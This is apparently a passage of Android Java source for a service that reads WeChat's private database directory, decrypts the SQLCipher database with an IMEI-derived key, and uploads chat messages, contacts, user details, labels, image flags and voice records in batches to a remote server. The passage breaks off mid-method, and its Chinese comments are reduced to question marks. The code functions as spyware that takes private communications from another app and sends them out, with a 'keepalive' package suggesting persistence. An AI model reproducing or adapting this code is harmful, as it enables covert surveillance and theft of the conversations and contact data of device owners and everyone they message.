package live_library.wechat2;

import android.annotation.SuppressLint;
import android.content.SharedPreferences;
import android.os.Environment;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.SPUtils;
import com.google.gson.Gson;
import com.mylike.keepalive.XApp;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;

import live_library.wechat2.bean.ChatRoom;
import live_library.wechat2.bean.ContactLabel;
import live_library.wechat2.bean.ImgFlag;
import live_library.wechat2.bean.JsonWrap;
import live_library.wechat2.bean.RMessage;
import live_library.wechat2.bean.Rcontact;
import live_library.wechat2.bean.Snscomment;
import live_library.wechat2.bean.Snsinfo;
import live_library.wechat2.bean.UserInfo;
import live_library.wechat2.bean.UserInfo2;
import live_library.wechat2.bean.VoiceInfo;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.db.SqlDataUtil1;
import live_library.wechat2.helper.ChatRoomHelper;
import live_library.wechat2.helper.ContactLabelHelper;
import live_library.wechat2.helper.ImgFlagHelper;
import live_library.wechat2.helper.MessageHelper;
import live_library.wechat2.helper.RcontactHelper1;
import live_library.wechat2.helper.SnscommentHelper;
import live_library.wechat2.helper.SnsinfoHelper;
import live_library.wechat2.helper.UserInfo2Helper;
import live_library.wechat2.helper.UserInfoHelper;
import live_library.wechat2.helper.VoiceinfoHelper;
import live_library.wechat2.http.RequestQueueSingle;
import live_library.wechat2.uploadpic.UploadPicService;
import live_library.wechat2.uploadpic.UploadPicService1;
import live_library.wechatlog.RLog;

import static android.content.Context.MODE_PRIVATE;
import static live_library.wechat2.db.SqlDataUtil1.WX_DB_FILE_NAME;

public class UploadService1 {

    /**
     * ????????????
     */
    private float pageSize = 50f;
    private int maxRetryCount =1;

    private static volatile UploadService1 mInstance;
    private final static String TAG = "UploadService1";

    private final static String TABLE_MESSAGE= "table_message";
    private final static String TABLE_CONTACT= "table_contact";
    private final static String TABLE_VOICE_INFO= "table_voice_info";
    private final static String TABLE_USER_INFO= "table_user_info";
    private final static String TABLE_USER_INFO2= "table_user_info2";
    private final static String TABLE_CHAT_ROOM= "table_chat_room";
    private final static String TABLE_CONTACT_LABEL= "table_contact_label";
    private final static String TABLE_IMG_FLAG= "table_img_flag";
    private final static String TABLE_SNS_INFO= "table_sns_info";
    private final static String TABLE_SNS_COMMENT= "table_sns_comment";


    //????????????
    private SQLiteDatabase contactDb;
    private SQLiteDatabase contactDb2;
    //?????????
    private SQLiteDatabase snsDb;

    private String imei;
    private File copyWxDataDb;


    @SuppressLint("MissingPermission")
    private UploadService1() {
        imei = UploadPicService1.getImei();

        //????????????????????????????????????????????????????????????db????????????????????????
        //?????????????????????????????????
        String userFileName = SqlDataUtil1.md5("mm" + SqlDataUtil1.getCurrWxUin());
        File wxDataDir = new File(SqlDataUtil1.WX_DB_DIR_PATH() + userFileName);
        RLog.d(TAG,"copy????????????:"+wxDataDir.exists());
        //?????????????????????
        String copyFilePath = SqlDataUtil1.CURR_APK_PATH + SqlDataUtil1.COPY_WX_DATA_DB;
        String copyFilePathWal = SqlDataUtil1.CURR_APK_PATH + SqlDataUtil1.COPY_WX_DATA_DB_WAL;
        String copyFilePathShm = SqlDataUtil1.CURR_APK_PATH + SqlDataUtil1.COPY_WX_DATA_DB_SHM;



        RLog.d(TAG,"?????????????????????????????????");
        //???????????????
        File file = new File(SqlDataUtil1.WX_DB_DIR_PATH() + userFileName + "/" + WX_DB_FILE_NAME);
        File fileWal = new File(SqlDataUtil1.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil1.WX_DB_FILE_NAME_WAL);
        File fileShm = new File(SqlDataUtil1.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil1.WX_DB_FILE_NAME_SHM);

        if (file != null) {
            RLog.d(TAG,"??????????????????????????????:"+file.getAbsolutePath());
            //????????????
//            SqlDataUtil.copyFile(file.getAbsolutePath(), copyFilePath);
            copyWxDataDb = new File(SqlDataUtil1.WX_DB_DIR_PATH()+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME);

            RLog.d(TAG,"????????????????????????:"+copyFilePath);
            //???????????????????????????
//            copyWxDataDb = new File(copyFilePath);
        }

        if (fileWal != null) {
            RLog.d(TAG,"??????????????????????????????:"+fileWal.getAbsolutePath());
//            SqlDataUtil.copyFile(fileWal.getAbsolutePath(), copyFilePathWal);
            RLog.d(TAG,"????????????????????????:"+copyFilePathWal);
        }

        if (fileShm != null) {
            RLog.d(TAG,"??????????????????????????????:"+fileShm.getAbsolutePath());
//            SqlDataUtil.copyFile(fileShm.getAbsolutePath(), copyFilePathShm);
            RLog.d(TAG,"????????????????????????:"+copyFilePathShm);
        }

       /* String smsPath = Environment.getExternalStorageDirectory() + "/yes/SnsMicroMsg.db";
        snsDb = SqlDataUtil.openWxDb1(new File(smsPath), "");*/
    }

    public static UploadService1 getInstance() {
        mInstance = new UploadService1();
        return mInstance;
    }


    /**
     * ???????????? ????????????????????????????????????????????????
     * @param tableName
     * @param map
     * @return
     */
    public String getTampByTableName(String tableName,Map<String,String> map){
        if (map.get(tableName)==null){
           return "0";
        }
        return map.get(tableName);
    }
    /**
     * ???????????????????????????10??????????????????
     * egCreateTime true ?????????????????????
     * egCreateTime false  ???????????????
     */
    public void startUpload() {
        try {
            contactDb = SqlDataUtil1.openCommonWxDb(copyWxDataDb, imei);
            if (contactDb == null){
//                String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
//                copyWxDataDb = new File("/data/user/999/com.tencent.mm/MicroMsg/"+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME);
//                contactDb = SqlDataUtil.openCommonWxDb(copyWxDataDb, imei);
//                RLog.d(TAG, "UploadService1-??????/data/user/999/com.tencent.mm/");
            }
            if (contactDb==null)return;
                final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
                //????????????id
                String wxId="";
                if (list.size()>0){
                    for (UserInfo userInfo : list) {
                        if ("2".equals(userInfo.id)){
                            wxId=userInfo.value;
                        }
                    }
                }
            SharedPreferences mSharedPreferences =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
            SharedPreferences.Editor editor = mSharedPreferences.edit();
            editor.putString("wxIdTwo", wxId);
            editor.commit();
            Map<String,String> map = SqlDataUtil1.getTableStamps();
            uploadMessage(wxId,getTampByTableName(TABLE_MESSAGE,map));
            uploadRContact(wxId, getTampByTableName(TABLE_CONTACT, map));
            uploadUserInfo(wxId, getTampByTableName(TABLE_USER_INFO, map));
            uploadContactLabel(wxId, getTampByTableName(TABLE_CONTACT_LABEL, map));
            uploadImgFlag(wxId,getTampByTableName(TABLE_IMG_FLAG,map));
            UploadPicService1.getInstance().openData(wxId);//??????????????????
            UploadPicService1.getInstance().openRuning(wxId);//?????????????????????
            RLog.d(TAG,"????????????????????????");
                contactDb.close();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    /**
     * ???????????????1???????????????
     */
    public void startUpload2() {
        try {
            contactDb2 = SqlDataUtil1.openWxDb(copyWxDataDb, imei);
//            uploadRContact("0");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    public void uploadMessage( String wxId,String updateTime){
        RLog.d(TAG,"uploadMessage");
        try {
            int totalCount = MessageHelper.getTotalCount(contactDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch =new CountDownLatch(pageCount);
            uploadMessageToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();
        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadRContact(String wxId,String updateTime){
        RLog.d(TAG,"uploadRContact");
        try {
            int totalCount = RcontactHelper1.getTotalCount(contactDb);
            if (totalCount==0){
                return;
            }
            int totalCount1 = SPUtils.getInstance().getInt("RContact_totalCount_other");
            if (totalCount1 ==totalCount) {
                return;
            }
            SPUtils.getInstance().put("RContact_totalCount_other", totalCount);
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch =new CountDownLatch(pageCount);
            uploadRcontactToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();
        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadVoiceInfo(String wxId,String updateTime){
        RLog.d(TAG,"uploadVoiceInfo");
        try {

            int totalCount = VoiceinfoHelper.getTotalCount(contactDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadVoiceInfoToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();
//
        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadUserInfo2(String wxId,String updateTime){
        try {
            RLog.d(TAG,"uploadUserInfo2");
            int totalCount = UserInfo2Helper.getTotalCount(contactDb);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadUserInfo2ToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();
        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }
    public void uploadUserInfo(String wxId,String updateTime){
        try {
            RLog.d(TAG,"uploadUserInfo");

            int totalCount = UserInfoHelper.getTotalCount(contactDb);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadUserInfoToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();

        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadChatRoom(String wxId,String updateTime){
        try {
            RLog.d(TAG,"uploadChatRoom");

            int totalCount = ChatRoomHelper.getTotalCount(contactDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadChatRoomToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();

        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadContactLabel(String wxId,String updateTime){
        try {
            RLog.d(TAG,"uploadContactLabel");

            int totalCount = ContactLabelHelper.getTotalCount(contactDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadContactLabelToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();

        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadImgFlag(String wxId,String updateTime){
        RLog.d(TAG,"uploadImgFlag");
        try {
            int totalCount = ImgFlagHelper.getTotalCount(contactDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadImgFlagToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();
        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadSnsinfo(String wxId,String updateTime){
        try {
            RLog.d(TAG,"uploadSnsinfo");

            int totalCount = SnsinfoHelper.getTotalCount(snsDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadSnsinfoToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();

        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadSnscomment(String wxId,String updateTime){
        RLog.d(TAG,"uploadSnscomment");
        try {
            int totalCount = SnscommentHelper.getTotalCount(snsDb,updateTime);
            if (totalCount==0){
                return;
            }
            int pageCount =(int)Math.ceil(totalCount/pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadSnscommentToServer(wxId,0,pageCount,0,countDownLatch,updateTime);
            countDownLatch.await();

        }catch (Exception e){
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void  releaseCountDownLatch(int currentCount , int totalCount, CountDownLatch countDownLatch){
        for (int i=0;i<totalCount-currentCount;i++){
            countDownLatch.countDown();
        }
    }

    public void uploadMessageToServer(String wxId, final int currentCount , final int totalCount,final int retryCount, final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadMessageToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadMessageToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;

        final List<RMessage> list = MessageHelper.getMessageList(contactDb, updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadMessageToServer:"+list.size());

        JsonWrap<RMessage> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("2");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "?????????????????????" + json + "???");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadMessageToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    RMessage data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_MESSAGE,data.getCreateTime());
                }
                countDownLatch.countDown();

//                 messageDao.insert(rMessages);
                uploadMessageToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadMessageToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadMessageToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadMessageToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadMessageToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(XApp.getApp()).add(stringRequest);
    }

    public void uploadRcontactToServer(String wxId,final int currentCount , final int totalCount,final int retryCount, final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadRcontactToServer ?????????????????? ");
//            uploadVoiceInfo(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadRcontactToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;

        final List<Rcontact> list = RcontactHelper1.getRcontactList(contactDb,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadRcontactToServer:"+list.size());
        JsonWrap<Rcontact> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("4");
        jsonWrap.setVxid(wxId);
        if (currentCount+1==totalCount) {
            jsonWrap.setOver("over");
        }else {
            jsonWrap.setOver("process");
        }
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
       // RLog.d(TAG, "uploadRcontactToServer ?????????????????? Json???" + json + "???");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadRcontactToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
//                if (list.size()>0){
//                    Rcontact data = rMessages.get(list.size()-1);
//                    updateTableStamp(TABLE_CONTACT,data.getCreateTime())
//                }
                countDownLatch.countDown();
                uploadRcontactToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadRcontactToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadRcontactToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadRcontactToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());

            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadRcontactToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(XApp.getApp()).add(stringRequest);
    }


    public void uploadVoiceInfoToServer(String wxId,final int currentCount , final int totalCount,final int retryCount, final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadVoiceInfoToServer ?????????????????? ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadVoiceInfoToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;

        final List<VoiceInfo> list = VoiceinfoHelper.getVoiceInfoList(contactDb, updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadVoiceInfoToServer:"+list.size());
        JsonWrap<VoiceInfo> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
//        jsonWrap.setType("4");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "?????????????????????" + json + "???");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadVoiceInfoToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    VoiceInfo data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_VOICE_INFO,data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadVoiceInfoToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadVoiceInfoToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadVoiceInfoToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadVoiceInfoToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadVoiceInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
    }

    public void uploadUserInfo2ToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadUserInfo2ToServer ?????????????????? ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadUserInfo2ToServer ???????????? "+currentCount+" = "+totalCount);
        final List<UserInfo2> list = UserInfo2Helper.getUserInfo2List(contactDb);
        RLog.d(TAG,"uploadUserInfo2ToServer:"+list.size());
        JsonWrap<UserInfo2> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("3");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadUserInfo2ToServer ?????????????????????" + json + "???");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                RLog.d(TAG, "uploadUserInfo2ToServer ????????????????????????" + response + "???");
                countDownLatch.countDown();
                uploadUserInfo2ToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadUserInfo2ToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadUserInfo2ToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadUserInfo2ToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfo2ToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
    }

    public void uploadUserInfoToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {
        if (currentCount==totalCount){
            RLog.d(TAG, "uploadUserInfoToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadUserInfoToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;
        final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
        RLog.d(TAG,"uploadUserInfoToServer:"+list.size());
        UserInfo version = new UserInfo();
        version.id = "version";
        version.value = AppUtils.getAppVersionName();
        list.add(version);
        UserInfo version2 = new UserInfo();
        version2.id = "tenantDept";
        version2.value = SqlDataUtil.readDept();
        list.add(version2);
        UserInfo version1 = new UserInfo();
        version1.id = "RegId";
        SharedPreferences mSharedPreferences1 =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
        version1.value = mSharedPreferences1.getString("RegId","");
        list.add(version1);
        JsonWrap<UserInfo> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("3");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "?????????????????????" + json + "???");
//        final UserInfo dao =new UserInnfoDao(BaseApplication.mContext);

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadUserInfoToServer ????????????????????????" + response + "???");
                countDownLatch.countDown();
                uploadUserInfoToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadUserInfoToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadUserInfoToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadUserInfoToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
                countDownLatch.countDown();
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
    }

    public void uploadChatRoomToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {
        if (currentCount==totalCount){
            RLog.d(TAG, "uploadChatRoomToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadChatRoomToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;
        final List<ChatRoom> list = ChatRoomHelper.getChatRoomList(contactDb,updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadUserInfoToServer:"+list.size());
        JsonWrap<ChatRoom> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("5");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadChatRoomToServer ?????????????????????" + json + "???");
//        final UserInfo dao =new UserInnfoDao(BaseApplication.mContext);

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadChatRoomToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    ChatRoom data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_CHAT_ROOM,data.modifytime);
                }
                countDownLatch.countDown();
                uploadChatRoomToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadChatRoomToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadChatRoomToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadChatRoomToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
    }

    public void uploadContactLabelToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {
        if (currentCount==totalCount){
            RLog.d(TAG, "uploadContactLabelToServer ?????????????????? ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadContactLabelToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;
        final List<ContactLabel> list = ContactLabelHelper.getContactLabelList(contactDb,updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadContactLabelToServer:"+list.size());
        JsonWrap<ContactLabel> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("7");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);

        String url = ConfigWechat.insertWeChatRecord;
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
